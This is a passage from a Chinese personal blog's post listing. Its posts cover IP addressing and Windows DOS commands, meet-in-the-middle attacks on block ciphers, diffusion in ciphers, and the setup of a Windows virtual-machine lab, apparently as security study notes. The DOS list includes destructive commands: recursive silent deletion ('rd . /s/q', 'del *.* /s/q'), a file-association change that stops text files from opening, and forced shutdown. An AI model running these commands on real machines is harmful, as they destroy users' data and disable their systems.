          <a href="/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-2-ip%E5%8F%8A%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4/" class="post-title-link" itemprop="url">网安学习-D-2-ip及一些命令</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-05-27 14:55:26 / 修改时间：16:40:57" itemprop="dateCreated datePublished" datetime="2022-05-27T14:55:26+08:00">2022-05-27</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CS/" itemprop="url" rel="index"><span itemprop="name">CS</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>ip 相关知识复习及常用 win 系统下的命令</p>
<h2 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h2><p>局域网：一般称为内网，同一个局域网中，所有IP必须在同一个网段才可以互相通信</p>
<p>单局域网构成：交换机，网线，pc</p>
<p>交换机：用来组建内网的局域网的设备</p>
<h2 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h2><p>网络号（识别主机所在网络） + 主机号（识别网络中的主机）</p>
<p>position_1.position_2.position_3.position_4  where  position  in [0,255]</p>
<p>ISO定义五大类：（是以IP地址的第一位进行区分的）</p>
<ul>
<li><p>A类：（政府用）</p>
<p>position_1 网络地址，position_2.position_3.position_4 主机地址</p>
<p>范围：1.0.0.1—126.155.255.254</p>
<p>私有地址和保留地址：</p>
<p>① 10.X.X.X是私有地址（所谓的私有地址就是在互联网上不使用，而被用在局域网络中的地址）<br>② 127.X.X.X是保留地址，用做循环测试用</p>
</li>
<li><p>B类：（大中型企业用）</p>
<p>position_1.position_2 网络地址，position_3.position_4 主机地址</p>
<p>范围：128.0.0.1—191.255.255.254</p>
<p>私有地址和保留地址：<br>① 172.16.0.0—172.31.255.255是私有地址<br>② 169.254.X.X是保留地址（如果你的IP地址是自动获取IP地址，而你在网络上又没有找到可用的<strong>DHCP服务器</strong>，就会得到其中一个IP）</p>
</li>
<li><p>C类：(个人使用，最常见)</p>
<p>position_1.position_2.position_3 网络地址，position_4 主机地址</p>
<p>范围：192.0.0.1—223.255.255.254</p>
<p>私有地址：<br>192.168.X.X是私有地址</p>
</li>
<li><p>D类：（组播地址）</p>
<p>不分网络地址和主机地址，它的第1个字节的前四位固定为1110</p>
</li>
<li><p>E类：（科研使用）<br>不分网络地址和主机地址，它的第1个字节的前四位固定为11110</p>
</li>
</ul>
<h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>规定 ip 在哪个网段，如 ip ： 192.168.1.1 子网掩码：255.255.240.0</p>
<p>二进制表示：</p>
<p>11000000.10101000.00000001.00000001 ip</p>
<p>11111111.11111111.11110000.00000000 子网掩码 （not = 00000000.00000000.00001111.11111111）</p>
<p><strong>在子网掩码非 1 的部分为该网段可用地址</strong></p>
<ul>
<li>ip 与 子网掩码之间的关系：（保留地址）</li>
</ul>
<p>ip and 子网掩码 = 11000000.10101000.00000000.00000000 = 192.168.0.0 为<strong>网络号</strong></p>
<p>ip or not 子网掩码 =  11000000.10101000.00001111.11111111 = 192.168.15.255 为<strong>广播地址</strong></p>
<p>所以也可表示为 192.168.1.1/24 （表示该ip子网掩码长度24位1）</p>
<p>参考： </p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wujiafei_njgcxy/article/details/53672410">5类ip地址</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1v44y1g7Hf?p=1&amp;share_medium=iphone&amp;share_plat=ios&amp;share_session_id=791F56D7-CDA5-44B3-87C0-0ECC2828078D&amp;share_source=WEIXIN&amp;share_tag=s_i&amp;timestamp=1653636322&amp;unique_k=GzxogMD">什么是子网掩码</a></p>
<p><a target="_blank" rel="noopener" href="https://www.huaweicloud.com/zhishi/edits-15756158.html">ip地址和子网掩码的关系</a></p>
</blockquote>
<h2 id="网关（简单理解）"><a href="#网关（简单理解）" class="headerlink" title="网关（简单理解）"></a>网关（简单理解）</h2><p>相当于一个转换器，用于寻找要通信的另一方：</p>
<p>pc向外发包</p>
<p>1、首先判断目标IP与自己是否在 同一个网段</p>
<p>2、如在同一个网段，则直接发出去，不找网关</p>
<p>3、<strong>如不在同一个网段，则发包给网关</strong></p>
<blockquote>
<p>ping 命令：</p>
<p>ping 目标IP地址                       #测试网络连通性，有去有回即为可以成功通路</p>
<p>ping -t 目标IP地址                    #一直ping</p>
<p>ping -n 数字 目标ip地址           #修改ping包的数量（默认4）</p>
<p>ping -l 数字 目标ip地址            #修改ping 包的大小</p>
<p>ipconfig      #查看ip基本信息</p>
<p>ipconfig /all   #查看ip所有信息</p>
</blockquote>
<h2 id="DNS-域名系统-Domain-Name-System"><a href="#DNS-域名系统-Domain-Name-System" class="headerlink" title="DNS 域名系统 Domain Name System"></a>DNS 域名系统 <strong>D</strong>omain <strong>N</strong>ame <strong>S</strong>ystem</h2><p>它作为将<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/域名/86062">域名</a>和<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/IP地址/150859">IP地址</a>相互<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/映射/20402620">映射</a>的一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/分布式数据库/1238109">分布式数据库</a>，能够使人更方便地访问互联网</p>
<blockquote>
<p>手工解析域名</p>
<p>nslookup www.baidu.com</p>
</blockquote>
<h2 id="DOS命令"><a href="#DOS命令" class="headerlink" title="DOS命令"></a>DOS命令</h2><blockquote>
<p>cd..               返回上级目录</p>
<p>cd\                返回根目录</p>
<p>d:                 进入D盘</p>
<p>cls                清空所有dos操作</p>
<p>dir                显示当前盘符文件信息</p>
<p>rd . /s/q        清空磁盘</p>
<p><strong>浏览文件</strong></p>
<p>type 文件名.扩展名                 显示</p>
<p>type 文件名.扩展名 |more       分页显示</p>
<p>例如：dir c:\windows |more</p>
<p><strong>创建文件</strong></p>
<p>md 文件夹名称                创建文件夹</p>
<p>echo “内容”&gt;文件名         创建文件</p>
<p><em>还要其他方式</em></p>
<p><strong>删除文件</strong></p>
<p>del *.txt                  删除所有txt结尾的文件</p>
<p>del <em>.</em>                    删除文件</p>
<p>del <em>.</em> /s/q             无提示删除</p>
<p>attrib +h 文件名         隐藏文件夹</p>
<p>attrib -h 文件名          取消文件夹</p>
<p>attrib +h +s +a 文件名              将文件夹隐藏设为系统文件</p>
<p>dir /a                          显示当前磁盘所有包括系统文件</p>
<p>快速生成一个空文件（有大小）</p>
<p>fsutil file createnew c:\system.ini 数字       在c盘创建文件指定文件大小</p>
<p><strong>修改关联</strong></p>
<p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/682376">assoc 修改文件关联</a></p>
<p>assoc .txt=exefile         修改打开txt文件的程序 使其无法打开</p>
<p>assoc .txt=txtfile           恢复</p>
<p>(未成功)</p>
<p><strong>shutdown</strong></p>
<p>shutdown -s -t 100 定时关机</p>
<p>shutdown -s -f -t 100 定时强制关机</p>
<p>shutdown -r -t 秒 定时重启</p>
<p>shutdown -a 取消定时</p>
<p>shutdown -l 注销，同logoff命令相同</p>
<p>shutdown -s -f -t 100 -c “haah”</p>
<p><strong>文件操作</strong></p>
<p>ren 旧名 新名                      重命名</p>
<p>move 原地址 新地址           移动</p>
<p>copy 原地址 目的地址         复制粘贴</p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/27/Cryptanalysis/About%20MITM%20and%20variants/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://ossimg.yzitc.com/2022/05/24/f573a763bec76.png">
      <meta itemprop="name" content="icSnow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="❄">
      <meta itemprop="description" content="ahhhhhhhhh~~~">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ❄">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/27/Cryptanalysis/About%20MITM%20and%20variants/" class="post-title-link" itemprop="url">MITM AttacK</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-05-27 14:43:54 / 修改时间：14:51:37" itemprop="dateCreated datePublished" datetime="2022-05-27T14:43:54+08:00">2022-05-27</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Cryptanalysis/" itemprop="url" rel="index"><span itemprop="name">Cryptanalysis</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Classical-MITM"><a href="#Classical-MITM" class="headerlink" title="Classical MITM"></a>Classical MITM</h1><p>在 Hellman 的文章<a target="_blank" rel="noopener" href="https://www.computer.org/csdl/magazine/co/1977/06/01646525/13rRUwInvDu">Special Feature Exhaustive Cryptanalysis of the NBS Data Encryption Standard</a>中给出了中间相遇攻击的基本概念。</p>
<p>首先需要意识到，中间相遇攻击也是穷举，但是结合了 TMTO 的思想，通过建表存一部分值，穷搜另一部分值来达到比穷举攻击更好的效益。</p>
<p><strong>经典MITM</strong>：<br>有迭代的分组密码，分组长度为 $n$ ，子密钥可独立的分为 $K_1||K_2$ </p>
<p><strong>MITM stage</strong></p>
<ol>
<li><p>任取明密文对 $(P,C) $ ，将密钥做以下划分：</p>
<p>前向轮密钥记为 $K_1$ ，后向轮密钥记为 $K_2$</p>
</li>
<li><p>用前向的密钥对明文加密得到中间值 $U$ ；同样的，用后向的密钥对密文解密得到中间值 $V$ </p>
</li>
<li><p>匹配中间值，判断 $U\overset{?}{=}V$ 如果是，则将使用的密钥（全部bit）存入候选密钥表中，否则丢弃（在该过程中，可能会有一些随机值也能够匹配）</p>
</li>
</ol>
<p><strong>Testing stage</strong></p>
<p>再次任选明密文对 $(P_1,C_1)$ 并对候选密钥表进行二次筛查，重复步该过程直至候选密钥表中仅剩 1 个密钥，即为正确密钥。</p>
<p><strong>NOTE</strong>：</p>
<ol>
<li>以上过程如果能够保证前向和后向密钥能够覆盖全密钥空间，则在匹配到 $U=V$ 时即可能得到正确密钥，但不能保证随机值导致的误报不会出现（这里总可能数为 $2^{|K_1|+|K_2|}$ ，但匹配的长度为 $2^{n}$，明显 $|K_1|+|K_2| &gt; n$（安全标准），所以产生的中间值肯定会有很多误报）假设这里能够此处匹配到的概率是 $2^{-n}$ ，而全可能密钥数为 $2^{|K_1|+|K_2|}$ ，所以筛选留下的密钥数为 $2^{|K_1|+|K_2|-n}$，这需要在后续的测试阶段不断筛选；</li>
<li>能够使用经典中间相遇攻击的前提是子密钥的独立性。</li>
</ol>
<p><strong>复杂度分析</strong></p>
<p>时间复杂度：将更大的密钥拿来查询（内存比时间更贵），所以时间复杂度为：</p>
<script type="math/tex; mode=display">
T = max(2^{K_1},2^{K_2})</script><p>空间复杂度：将更小的密钥拿来查询，所以空间复杂度为：</p>
<script type="math/tex; mode=display">
M = min(2^{K_1},2^{K_2})</script><p>数据复杂度：留下的候选密钥 $|K_1|+|K_2|-n\ bits$ 而对每个新的明密文对， 理想情况下会筛掉 $n\ bits$ ，所以数据复杂度为：</p>
<script type="math/tex; mode=display">
D = \frac{|K_1|+|K_2|-n}{n}</script><p>（这里没有考虑建表和查表的时间，后面也不会考虑，如果考虑，通过较优化的算法如快速排序，二分查找之类，建表并排序的时间大概为 $2^{log(min(2^{K_1},2^{K_2}))}$，查表时间大概为 $2^{log(max(2^{K_1},2^{K_2}))}$）</p>
<h1 id="MITM-variant-No-OnE-partial-matching"><a href="#MITM-variant-No-OnE-partial-matching" class="headerlink" title="MITM variant No.OnE (partial matching)"></a>MITM variant No.OnE (partial matching)</h1><p>在进行经典 MITM 时，大多数情况不能在中间匹配到等于分组长度的状态，即 $n=s$ 往往不能满足。</p>
<p>所以更多情况下，往往只对分组长的部分比特进行匹配，也即部分匹配。</p>
<p>这是一种匹配的技巧，在中间相遇攻击中都会用到，如经典 MITM 的 MITM stage 中，步骤 2. 的得到的 $U\ and\ V$ 的长度往往比分组长度小，但这样部分匹配也引发了一定的问题：</p>
<p>见经典 MITM NOTE 1. 匹配到的概率会变小，如果状态长度为 $s\ (s&lt;n)$ 那么匹配到的概率就是 $2^{-s}$ ，留下的密钥数量就是$2^{|K_1|+|K_2|-s}$ ，在后面测试阶段就需要更多的明密文对来筛选候选密钥集。当然也可以利用并行搜索的办法，减少留下的候选密钥数量，并行 $N$ 个明密文对来进行 MITM ，留下的密钥数量就是$2^{|K_1|+|K_2|-N*s}$ ，MITM 阶段和测试阶段的操作没有实质性的变换，但复杂度需要重新考虑：</p>
<p><strong>复杂度分析：</strong></p>
<p>时间复杂度：并行 N 个明密文对，所以时间复杂度变为：</p>
<script type="math/tex; mode=display">
T = max(2^{K_1},2^{K_2})*N</script><p>空间复杂度：同样的，并行 N 个明密文对，所以空间复杂度变为：</p>
<script type="math/tex; mode=display">
M = min(2^{K_1},2^{K_2})*N</script><p>数据复杂度：MITM 阶段和测试阶段都使用了多个明密文对，取较大的作为数据复杂度量级：</p>
<script type="math/tex; mode=display">
D = max(\frac{|K_1|+|K_2|-s*N}{n},N)</script><h1 id="MITM-variant-No-TwO-3-subset"><a href="#MITM-variant-No-TwO-3-subset" class="headerlink" title="MITM variant No.TwO (3 subset)"></a>MITM variant No.TwO (3 subset)</h1><p>从经典的 MITM 考虑，如果子密钥不能独立，那么建表和穷举部分都无法独立进行，参考文章<a target="_blank" rel="noopener" href="https://link.springer.com/chapter/10.1007/978-3-642-19574-7_16">A 3-Subset Meet-in-the-Middle Attack: Cryptanalysis of the Lightweight Block Cipher KTANTAN</a> 和文章<a target="_blank" rel="noopener" href="https://link.springer.com/chapter/10.1007/978-3-642-31410-0_9">Three-Subset Meet-in-the-Middle Attack on Reduced XTEA</a> 了解使用 3 子集来构造具有独立性的子密钥集合，并结合穷举和经典 MITM 来进行中间相遇攻击。</p>
<p><img src="https://ossimg.yzitc.com/2022/05/27/d6d5603020045.png"></p>
<p>术语解释：</p>
<p>$K=k_{\ell-1} k_{\ell-2} \ldots k_{1} k_{0} \text { be the } \ell \text {-bit key. }$</p>
<p>$K_{1}=\left\{k_{i}: k_{i} \text { used by } \varphi_{1, \alpha}\right\}$</p>
<p>$K_{2}=\left\{k_{i}: k_{i} \text { used by } \varphi_{R-\beta+1, R}\right\}$</p>
<p>$A_{0}=K_{1} \cap K_{2}$是在前向 $\alpha$ 和后向 $\beta$ 都使用的密钥 <strong>比特</strong></p>
<p>$K = K_1 \cup K_2$</p>
<p><strong>NOTE</strong>:明确一点：$K,K_i$ 是以密钥个为单位，$Ai$ 以比特为单位；</p>
<p>$A_{1}=K_{1} \backslash K_{1} \cap K_{2} \text { and } A_{2}=K_{2} \backslash K_{1} \cap K_{2}$ 就比较好理解，这里 \ 表示除去而非经典数学的除法。例如：</p>
<p>密钥总位数为 $32\ bits$;相关部分为 $|A_0| = 21\ bits$ 那么 $|A_1|=|A_2|=11\ bits$</p>
<p><strong>3-subset MITM：</strong><br>有迭代的分组密码，分组长度为 $n$ ，子密钥不独立的分为 $K_1,K_2$，有 $A_0\ bits$ 为公用密钥，$A_{1}=K_{1} \backslash K_{1} \cap K_{2}\ bits\  \text { and }\  A_{2}=K_{2} \backslash K_{1} \cap K_{2}\ bits$</p>
<p><strong>MITM stage</strong></p>
<p>对任意一个明密文对 $(P,C)$ </p>
<ol>
<li>穷举所有 $A_0\ bits$ ，并对每一种 $A_0$ 情况，进行步骤 2. 3.；</li>
<li>将 $A_0$ 与 $A_1$ 拼接获得 $K_1$，前向加密得到中间值 $U$，将所有 $U$ 存入表 $T$;</li>
<li>将 $A_0$ 与 $A_2$ 拼接获得 $K_2$，向后解密得到中间值 $V$，将所有 $V$ 与表 $T$ 中所有值进行匹配（不一定匹配中间值的全部比特），匹配到的值存入候选密钥表 $T_{vc}$ 中;</li>
</ol>
<p><strong>Testing Stage</strong></p>
<p>和经典 MITM 相同，再任选不同的明密文对，对表 $T_{vc}$ 进行筛查，直到仅留下 1 个密钥。这里使用的明密文对数量和 $|A_0|$ 有关，显然是成反比的。</p>
<p><strong>复杂度分析</strong></p>
<p>不考虑并行明密文对，这里的 $A_0,A_1,A_2$ 表示密钥的长度$（bits)$：</p>
<p>时间复杂度：建表时间 $2^{A_0}<em>2^{A_1}$ ，匹配时间 $2^{A_0}</em>2^{A_2}$ ，总时间：</p>
<script type="math/tex; mode=display">
T = 2^{A_0}*(2^{A_1}+2^{A_2})</script><p>空间复杂度：</p>
<script type="math/tex; mode=display">
M = 2^{A_0}*min(2^{A_1}+2^{A_2})</script><p>数据复杂度：假设中间值匹配的位数为 $m\ :\ 1&lt;=m&lt;=n$ ，则留下的候选密钥为 $A_0(A_1+A_2) - m\ bits$，所以测试需要的明密文对为：</p>
<script type="math/tex; mode=display">
D = \frac{A_0(A_1+A_2) - m}{n}</script><h1 id="MITM-variant-No-ThreE-All-Subkey-Recovery"><a href="#MITM-variant-No-ThreE-All-Subkey-Recovery" class="headerlink" title="MITM variant No.ThreE (All Subkey Recovery)"></a>MITM variant No.ThreE (All Subkey Recovery)</h1><p>原始文章： <a target="_blank" rel="noopener" href="https://link.springer.com/chapter/10.1007/978-3-642-35999-6_14">All Subkeys Recovery Attack on Block Ciphers: Extending Meet-in-the-Middle Approach</a></p>
<p>从经典中间相遇攻击而来，考虑到经典中间相遇攻击的局限性：</p>
<ol>
<li><p>需要子密钥相互独立，不独立情况见 “MITM variant No.TwO (3 subset)” 部分</p>
</li>
<li><p>由于密钥编排算法的限制，可能无法在仅获得部分子密钥的情况下获取主密钥</p>
</li>
</ol>
<p>ASR 攻击注意针对第 2 个局限进行改进，即试图使用中间相遇的思想来恢复全部子密钥，从而忽略密钥编排算法的影响，如果密钥编排可逆，也可以利用所有子密钥恢复主密钥。</p>
<p><strong>ASR attack</strong></p>
<p>假设分组密码分组长度为 $n$ ，加密函数为 $E$ ，有 $R$ 轮，且每轮使用不同的加密子密钥，子密钥不需要全部独立（但需要有部分独立的情况存在）</p>
<p><strong>MITM stage</strong></p>
<ol>
<li><p>攻击者确定中间碰撞状态 $S\ (s-bits)$ ；这个过程并不能独立后面的步骤，和 $K_1,K_2$ 的选取有很大关系</p>
<p>状态 $S$ 可以从两个方向计算得来，即 $S=F_{1}(P,K_1) = F_2^{-1}(C,K_2)$ ，其中 $F_1,F_2$ 分别是前向和后向的（部分）加密函数</p>
<p>但并不是仅有 $K_1,K_2$ 就可以从明文加密到密文，还有剩余没有用上的密钥 $K_3$ ，所以有 $\left|\mathcal{K}_{(1)}\right|+\left|\mathcal{K}_{(2)}\right|+\left|\mathcal{K}_{(3)}\right|=R \cdot \ell$ </p>
<p>对于此处的 $K_1,K_2$ ，需要能够保证 $F_{1}(P,K_1) = F_2^{-1}(C,K_2)$ 的计算是独立的；</p>
</li>
<li><p>将 $min(K_1,K_2)$ 得到的 $(P/C,S)$ 拿来存表，而另一部分用来做匹配，如果能够在状态 $S$ 匹配到，即 $S=F_{1}(P,K_1) = F_2^{-1}(C,K_2)$ ，则将使用的密钥 $K_1,K_2$ 加入候选密钥表；</p>
</li>
<li><p>考虑到并行操作，可以对多个明密文对并行操作进行步骤 2.</p>
</li>
</ol>
<p><strong>Test Stage</strong></p>
<p>同样的，使用不同明密文对测试，但测试的不是是否能够从明文加密到密文，因为整个过程没有考虑 $K_3$ ，而是测试使用不同的明密文能否找到状态 $S$ 的匹配 ？ 是这样吗？？</p>
<p><strong>NOTE</strong></p>
<ol>
<li><p>在步骤 2. 有 $2^{-s}$ 的概率在状态 $S$ 匹配到，而总可能密钥数为 $2^{R<em>l}$ 所以留下的候选密钥为 $2^{R</em>l-s}$ 个，而并行使用 N 个明密文对留下的候选密钥就为  $2^{R<em>l-N</em>s}$ 个；</p>
</li>
<li><p>这里可以并行使用的明密文对数量 N 为，需要有一定的限制：</p>
<p>$2^{R<em>l-N</em>s} \leq 2^{R*l-(|K_1|+|K_2|)}$ 即 $N\leq(|K_1|+|K_2|)/s$，如果不满足，则意味着使用 $2^{|K_1|+|K_2|}$ 种密钥筛掉了超过大于 $2^{|K_1|+|K_2|}$ 个密钥，这是不合理的；</p>
</li>
</ol>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：选 $|K_1|,|K_2|$ 更大的用来做匹配，对 N 个明密文对，就需要 $\max \left(2^{\left|\mathcal{K}_{(1)}\right|}, 2^{\left|\mathcal{K}_{(2)}\right|}\right) \times N$ 的计算，而对剩余的密钥 $K_3$ 就需要穷举，需要 $2^{R \cdot \ell-N \cdot s}$ 的计算，所以总时间复杂度为：</li>
</ul>
<script type="math/tex; mode=display">
T_n = C_{c o m p}=\max \left(2^{\left|\mathcal{K}_{(1)}\right|}, 2^{\left|\mathcal{K}_{(2)}\right|}\right) \times N+2^{R \cdot \ell-N \cdot s} .</script><ul>
<li>空间复杂度：选 $|K_1|,|K_2|$ 更小的用来建表，对 N 个明密文对，总空间复杂度为：</li>
</ul>
<script type="math/tex; mode=display">
S_n = \min \left(2^{\left|\mathcal{K}_{(1)}\right|}, 2^{\left|\mathcal{K}_{(2)}\right|} \mid\right) \times N</script><ul>
<li>数据复杂度：并行 N 个不同的明密文对，在测试阶段，留下密钥 $R<em>l-N</em>s$ bits，因为分组长度为 n ，所以每个新的明密文对可以筛掉 n bits（<strong>注意</strong>这个过程：$P \rightarrow E_k \rightarrow C$ ，这里的 $_k$ 会遍历所有留下的候选密钥，而理论上会有 n 个被筛掉）所以需要进行  $\lceil(R \cdot \ell-N \cdot s) / n\rceil$ 次筛查，数据复杂度为：</li>
</ul>
<script type="math/tex; mode=display">
D_n = \max (N,\lceil(R \cdot \ell-N \cdot s) / n\rceil)</script>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/26/Cryptanalysis/Basic-Diffusion/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://ossimg.yzitc.com/2022/05/24/f573a763bec76.png">
      <meta itemprop="name" content="icSnow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="❄">
      <meta itemprop="description" content="ahhhhhhhhh~~~">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ❄">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/26/Cryptanalysis/Basic-Diffusion/" class="post-title-link" itemprop="url">Diffusion Basic</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2022-05-26 16:35:24 / 修改时间：17:07:12" itemprop="dateCreated datePublished" datetime="2022-05-26T16:35:24+08:00">2022-05-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>香农提出了密码设计的两种基本方法即 混淆和扩散。</p>
<p>分组密码系统包括 线性部分 和 非线性部分，其对应功能分别是 扩散和混淆。</p>
<p>扩散性往往由线性函数提供，如 rotation ，shift ，或更复杂的 MDS matrix（但其本质也是 rotation and shift）。</p>
<p>在研究扩散性时，如果往其最基本单元考虑：</p>
<p>线性运算时一般是 位切片操作，即对每一个 bit 进行运算。那么总体来看就是一个面向 GPU 友好型的 <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8D%95%E6%8C%87%E4%BB%A4%E6%B5%81%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%B5%81/257612">SIMD</a> 操作 ，对一个 bit 的操作不会影响到其他 bits，显然这是不能够满足扩散性的，那么就需要一些 rotation，shift… 来将 bit 打散，使其能够更多的参与到非线性运算。</p>
<p>由于 扩散主要是用来使用明文和密文的关系变得尽可能的复杂，明文中任何一点小更动都会使得密文有很大的差异，即达到雪崩效应。</p>
<blockquote>
<p>雪崩效应：对于密码而言，要求输入位的 1 bit 变化导致每个输出位 bit 有 50% 的概率发生反转</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/19000/shannon-confusion-and-diffusion-concept/44659#44659">The job of the linear diffusion layer is to ensure that each successive input to the non-linear function consists of a balanced and maximum number of super-positioned input bits.</a></p>
<p>而验证扩散性是否能够尽可能地达到使密码系统安全的办法，除建立相关性方程，利用如 Mathmatica 等工具来搜索之外，可能还需要考虑由于扩散不全而造成的分支代数次数低，差分线性分析等等。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/25/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-1-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://ossimg.yzitc.com/2022/05/24/f573a763bec76.png">
      <meta itemprop="name" content="icSnow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="❄">
      <meta itemprop="description" content="ahhhhhhhhh~~~">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ❄">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/25/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-1-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/" class="post-title-link" itemprop="url">网安学习_D.1_环境部署</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-05-25 20:50:18" itemprop="dateCreated datePublished" datetime="2022-05-25T20:50:18+08:00">2022-05-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-05-27 14:56:57" itemprop="dateModified" datetime="2022-05-27T14:56:57+08:00">2022-05-27</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CS/" itemprop="url" rel="index"><span itemprop="name">CS</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>使用 Vmware 装上几个旧window系统的虚拟机 win-xp/2003/7/2008</p>
<h2 id="winxp"><a href="#winxp" class="headerlink" title="winxp"></a>winxp</h2><p>我的配置：</p>
<ol>
<li>使用的 winxp_professional 镜像(来自 msdn.itellyou)，删掉了 打印机，声卡</li>
<li>分配 40G 空间（20+20）</li>
<li>关掉了防火墙和自动更新</li>
<li>至此，拍摄快照并克隆虚拟机（链接）<ul>
<li>链接克隆和完整克隆的区别：链接克隆创建一个主虚拟机的子链接， 与主虚拟机并存（占用空间小）；完整克隆复制出一个独立的虚拟机（占用和主虚拟机一样大的空间）</li>
</ul>
</li>
</ol>
<h2 id="win2003"><a href="#win2003" class="headerlink" title="win2003"></a>win2003</h2><p>同上</p>
<h2 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h2><p>没设密码</p>
<h2 id="win2008"><a href="#win2008" class="headerlink" title="win2008"></a>win2008</h2><p>同上</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/25/Lc_daily/LC-5.23-t.675-Cut-Off-Trees-for-Golf-Event/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://ossimg.yzitc.com/2022/05/24/f573a763bec76.png">
      <meta itemprop="name" content="icSnow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
